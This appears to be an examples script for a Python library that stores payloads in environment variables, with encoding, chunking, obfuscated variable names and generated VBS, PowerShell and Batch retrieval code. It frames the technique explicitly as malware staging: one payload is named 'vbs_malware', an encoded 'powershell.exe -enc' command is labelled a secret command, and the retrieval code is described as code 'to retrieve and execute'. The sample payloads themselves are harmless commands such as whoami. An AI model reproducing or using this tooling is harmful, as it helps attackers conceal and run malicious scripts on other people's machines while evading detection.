#!/usr/bin/env python3
"""
Environment Variable Storage - Practical Examples
Demonstrates various usage patterns and integration scenarios
"""

from env_var_storage import (
    EnvVarWriter, EnvVarReader, EnvVarConfig,
    EnvVarScope, EnvVarEncoding, create_env_var_writer
)
import json
import os


def example_1_basic_storage():
    """Example 1: Basic payload storage"""
    print("\n" + "="*60)
    print("Example 1: Basic Payload Storage")
    print("="*60)

    # Create writer with default configuration
    writer = create_env_var_writer()

    # Simple payload
    payload = "Hello, World! This is a test payload."

    # Write to environment
    success, vars_list, message = writer.write_to_env("greeting", payload)

    print(f"Success: {success}")
    print(f"Message: {message}")
    print(f"Variables stored ({len(vars_list)}):")
    for var in vars_list:
        print(f"  - {var}")

    return success


def example_2_custom_encoding():
    """Example 2: Using different encoding methods"""
    print("\n" + "="*60)
    print("Example 2: Custom Encoding Methods")
    print("="*60)

    payload = "Secret Command: powershell.exe -enc UCwAQQBCAEMA"

    encodings = [
        EnvVarEncoding.RAW,
        EnvVarEncoding.BASE64,
        EnvVarEncoding.HEX,
        EnvVarEncoding.CHUNKED_BASE64,
    ]

    for encoding in encodings:
        config = EnvVarConfig(
            scope=EnvVarScope.PROCESS,
            encoding=encoding
        )
        writer = EnvVarWriter(config)

        success, vars_list, msg = writer.write_to_env("payload", payload)

        print(f"\nEncoding: {encoding.value}")
        print(f"  Success: {success}")
        print(f"  Variables: {len(vars_list)}")
        if vars_list:
            meta_var = [v for v in vars_list if "_META" in v][0]
            meta_str = os.environ.get(meta_var)
            if meta_str:
                meta = json.loads(meta_str)
                print(f"  Chunk Count: {meta.get('total_chunks')}")
                print(f"  Original Size: {meta.get('original_size')} bytes")
                print(f"  Encoded Size: {meta.get('encoded_size')} bytes")
                if meta.get('encoded_size') > 0 and meta.get('original_size') > 0:
                    overhead = (meta.get('encoded_size') / meta.get('original_size') - 1) * 100
                    print(f"  Overhead: {overhead:.1f}%")


def example_3_large_payload():
    """Example 3: Handling large payloads with automatic chunking"""
    print("\n" + "="*60)
    print("Example 3: Large Payload with Chunking")
    print("="*60)

    # Create a large payload (simulating VBS script)
    large_payload = """
    ' This is a large VBS payload with many lines
    """ + ("' Line of payload\n" * 500)

    config = EnvVarConfig(
        scope=EnvVarScope.PROCESS,
        encoding=EnvVarEncoding.CHUNKED_BASE64,
        chunk_size=500  # Smaller chunks for demonstration
    )

    writer = EnvVarWriter(config)
    success, vars_list, msg = writer.write_to_env("large_vbs", large_payload)

    print(f"Success: {success}")
    print(f"Payload Size: {len(large_payload)} bytes")
    print(f"Variables Created: {len(vars_list)}")

    # Show chunk breakdown
    meta_var = [v for v in vars_list if "_META" in v][0]
    meta_str = os.environ.get(meta_var)
    if meta_str:
        meta = json.loads(meta_str)
        print(f"Total Chunks: {meta.get('total_chunks')}")
        print(f"Chunk Size: {meta.get('chunk_size')} bytes")
        print(f"Encoded Size: {meta.get('encoded_size')} bytes")

        # Show chunk distribution
        print("\nChunk Variables:")
        for i in range(min(3, meta.get('total_chunks', 0))):
            chunk_name = f"SC_VAR_*_CHUNK_{i:03d}"
            print(f"  Chunk {i}: (first 50 bytes shown)")

    return success


def example_4_obfuscation():
    """Example 4: Variable name obfuscation"""
    print("\n" + "="*60)
    print("Example 4: Variable Name Obfuscation")
    print("="*60)

    payload = "obfuscated_payload"

    # With obfuscation
    config_obf = EnvVarConfig(use_obfuscation=True)
    writer_obf = EnvVarWriter(config_obf)

    obf_name = writer_obf.obfuscate_var_name("secret")
    print(f"Original name: 'secret'")
    print(f"Obfuscated name: '{obf_name}'")

    # Without obfuscation
    config_plain = EnvVarConfig(use_obfuscation=False, prefix="TEST_")
    writer_plain = EnvVarWriter(config_plain)

    plain_name = writer_plain.obfuscate_var_name("secret")
    print(f"Without obfuscation: '{plain_name}'")

    # Store with obfuscation
    success, vars_list, _ = writer_obf.write_to_env("mysecret", payload)
    print(f"\nVariables with obfuscation: {vars_list}")


def example_5_retrieval_scripts():
    """Example 5: Generating retrieval scripts"""
    print("\n" + "="*60)
    print("Example 5: Retrieval Script Generation")
    print("="*60)

    writer = create_env_var_writer()

    payload = "Retrieved Payload Data"
    writer.write_to_env("payload", payload)

    # Generate VBS retrieval
    print("\nVBS Retrieval Script (first 500 chars):")
    print("-" * 40)
    vbs_code = writer.get_retrieval_code("payload", "vbs")
    print(vbs_code[:500] + "...")

    # Generate PowerShell retrieval
    print("\n\nPowerShell Retrieval Script (first 500 chars):")
    print("-" * 40)
    ps_code = writer.get_retrieval_code("payload", "powershell")
    print(ps_code[:500] + "...")

    # Generate Batch retrieval
    print("\n\nBatch Retrieval Script (first 500 chars):")
    print("-" * 40)
    batch_code = writer.get_retrieval_code("payload", "batch")
    print(batch_code[:500] + "...")


def example_6_multiple_payloads():
    """Example 6: Storing multiple payloads"""
    print("\n" + "="*60)
    print("Example 6: Managing Multiple Payloads")
    print("="*60)

    writer = create_env_var_writer(scope=EnvVarScope.PROCESS)

    payloads = {
        "cmd_payload": "powershell.exe -Command whoami",
        "vbs_payload": "WScript.Echo 'Hello World'",
        "ps_payload": "$PSVersionTable.PSVersion",
    }

    results = {}
    total_vars = 0

    for name, payload in payloads.items():
        success, vars_list, msg = writer.write_to_env(name, payload)
        results[name] = {
            "success": success,
            "var_count": len(vars_list),
            "message": msg
        }
        total_vars += len(vars_list)

    print(f"Total payloads: {len(results)}")
    print(f"Total environment variables: {total_vars}\n")

    for name, result in results.items():
        status = "✓" if result["success"] else "✗"
        print(f"{status} {name}")
        print(f"  Variables: {result['var_count']}")
        print(f"  Status: {result['message']}")

    # List all stored
    reader = EnvVarReader()
    all_payloads = reader.list_payload_vars()
    print(f"\nTotal stored payloads: {len(all_payloads)}")


def example_7_metadata_tracking():
    """Example 7: Tracking payload metadata"""
    print("\n" + "="*60)
    print("Example 7: Metadata Tracking")
    print("="*60)

    writer = create_env_var_writer(scope=EnvVarScope.PROCESS)

    payload = "metadata_test_payload_with_extra_content"

    # Write payload
    success, vars_list, _ = writer.write_to_env("tracked", payload)

    # Get metadata
    metadata = writer.get_var_metadata()

    print(f"Payloads tracked: {len(metadata)}\n")

    for var_name, meta in metadata.items():
        print(f"Variable: {var_name}")
        print(f"  Scope: {meta.get('scope')}")
        print(f"  Encoding: {meta.get('encoding')}")
        print(f"  Size: {meta.get('size')} bytes")
        print(f"  Created: {meta.get('created')}")


def example_8_error_handling():
    """Example 8: Error handling and validation"""
    print("\n" + "="*60)
    print("Example 8: Error Handling")
    print("="*60)

    writer = create_env_var_writer(scope=EnvVarScope.PROCESS)

    # Test 1: Normal payload
    print("Test 1: Valid small payload")
    success, vars_list, msg = writer.write_to_env("valid", "small payload")
    print(f"  Result: {success} - {msg}")

    # Test 2: Very large payload (may exceed limits)
    print("\nTest 2: Very large payload (50KB)")
    large = "X" * 50000
    success, vars_list, msg = writer.write_to_env("large", large)
    print(f"  Result: {success}")
    if success:
        print(f"  Variables created: {len(vars_list)}")
    else:
        print(f"  Error: {msg}")

    # Test 3: Special characters
    print("\nTest 3: Payload with special characters")
    special = "!@#$%^&*()[]{}\"'`~\\|<>?"
    success, vars_list, msg = writer.write_to_env("special", special)
    print(f"  Result: {success}")

    # Test 4: Unicode
    print("\nTest 4: Unicode payload")
    unicode_payload = "Unicode test: éñü"
    success, vars_list, msg = writer.write_to_env("unicode", unicode_payload)
    print(f"  Result: {success}")


def example_9_encoding_comparison():
    """Example 9: Compare encoding efficiency"""
    print("\n" + "="*60)
    print("Example 9: Encoding Efficiency Comparison")
    print("="*60)

    payload = "This is a test payload for encoding comparison. " * 10

    encodings = [
        EnvVarEncoding.RAW,
        EnvVarEncoding.BASE64,
        EnvVarEncoding.HEX,
    ]

    print(f"Original payload size: {len(payload)} bytes\n")
    print(f"{'Encoding':<20} {'Encoded Size':<15} {'Overhead':<10}")
    print("-" * 45)

    for encoding in encodings:
        writer = EnvVarWriter(EnvVarConfig(encoding=encoding))
        encoded = writer.encode_value(payload, encoding)
        size = len(encoded)
        overhead = ((size / len(payload)) - 1) * 100

        print(f"{encoding.value:<20} {size:<15} {overhead:>6.1f}%")


def example_10_practical_vbs_integration():
    """Example 10: Practical VBS integration example"""
    print("\n" + "="*60)
    print("Example 10: Practical VBS Integration")
    print("="*60)

    # Simulate a VBS payload
    vbs_payload = """
Set objShell = CreateObject("WScript.Shell")
objShell.Run "cmd.exe /c whoami > %temp%\\output.txt", 0, True
Dim objFSO, objFile
Set objFSO = CreateObject("Scripting.FileSystemObject")
Set objFile = objFSO.OpenTextFile("%temp%\\output.txt")
Dim output
output = objFile.ReadAll
objFile.Close
MsgBox output
"""

    writer = create_env_var_writer(
        scope=EnvVarScope.PROCESS,
        encoding=EnvVarEncoding.CHUNKED_BASE64
    )

    # Store the payload
    success, vars_list, msg = writer.write_to_env("vbs_malware", vbs_payload)

    print(f"Payload stored successfully: {success}")
    print(f"Total variables: {len(vars_list)}")

    # Show how to retrieve
    print("\nVBS code to retrieve and execute:")
    print("-" * 40)
    retrieval_code = writer.get_retrieval_code("vbs_malware", "vbs")
    print(retrieval_code[:400])
    print("\n[... retrieval code continues ...]")


def run_all_examples():
    """Run all examples"""
    print("\n" + "="*60)
    print("Environment Variable Storage - Examples")
    print("="*60)

    examples = [
        ("Basic Storage", example_1_basic_storage),
        ("Custom Encoding", example_2_custom_encoding),
        ("Large Payloads", example_3_large_payload),
        ("Obfuscation", example_4_obfuscation),
        ("Retrieval Scripts", example_5_retrieval_scripts),
        ("Multiple Payloads", example_6_multiple_payloads),
        ("Metadata Tracking", example_7_metadata_tracking),
        ("Error Handling", example_8_error_handling),
        ("Encoding Comparison", example_9_encoding_comparison),
        ("VBS Integration", example_10_practical_vbs_integration),
    ]

    for idx, (name, func) in enumerate(examples, 1):
        try:
            func()
        except Exception as e:
            print(f"\nError in {name}: {e}")

    print("\n" + "="*60)
    print("All examples completed!")
    print("="*60)


if __name__ == "__main__":
    run_all_examples()
